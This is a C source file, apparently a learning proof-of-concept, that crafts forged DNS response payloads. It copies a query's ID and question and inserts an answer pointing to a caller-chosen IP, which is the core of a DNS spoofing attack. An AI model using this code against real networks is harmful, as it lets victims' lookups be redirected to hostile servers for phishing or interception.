/*

  Author:  Felix Bilstein
  Date:	   23-Dec-2015
  Comment: This is a proof-of-concept and a short example how to use libpcap in C.
           Interesting is for example the source for the calculation of the checksums as well
           as parsing different structures using buffers and struct castings (interesting for newbies in C),
           since this is a basic way in C to work with data.
           It is not designed to be used by anyone, more kind of a project to learn raw sockets and libpcap.

  File:    dns_spoofing.c
*/

#include "dns_spoofing.h"


int calculate_payload(int (*calc)(const u_char *in, int max_in_len, u_char *out, int max_out_len, u_char *ip), const u_char *in, int max_in_len, u_char *out, int max_out_len, u_char *ip) {
	return (*calc)(in, max_in_len, out, max_out_len, ip);
}

int spoof_dns_payload(const u_char *in, int max_in_len, u_char *out, int max_out_len, u_char *ip) {
	const u_char standard_protocol_first[] = {0x81, 0x80, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01};
	const u_char standard_protocol_second[] = {0x00, 0x01, 0x00, 0x01, 0xC0, 0x0C, 0x00, 0x01, 0x00, 0x01};
	const u_char standard_protocol_third[] = {0x00, 0x00, 0x29, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

	out[0] = in[0];
	out[1] = in[1];
	memcpy(out+2, standard_protocol_first, sizeof(standard_protocol_first));

	memcpy(out+12, in+12, strlen(in+12)+1);
	memcpy(out+12+strlen(in+12)+1, standard_protocol_second, sizeof(standard_protocol_second));

	u_char *tmp_payload = out+12+strlen(in+12)+1+sizeof(standard_protocol_second);
	u_int32_t dns_ttl = htonl(0x00014aa1);
	memcpy(tmp_payload, &dns_ttl, sizeof(u_int32_t));
	u_int16_t data_length = htons(4);
	memcpy(tmp_payload+4, &data_length, sizeof(u_int16_t));
	//u_int32_t ip_addr = inet_addr("1.2.3.4");
	u_int32_t ip_addr = inet_addr(ip);
	memcpy(tmp_payload+6, &ip_addr, sizeof(u_int32_t));

	tmp_payload = tmp_payload+4+2+4;
	memcpy(tmp_payload, standard_protocol_third, sizeof(standard_protocol_third));

	int size_new_payload = 12+strlen(in+12)+1+sizeof(standard_protocol_second)+4+2+4+sizeof(standard_protocol_third);
	return size_new_payload;
}
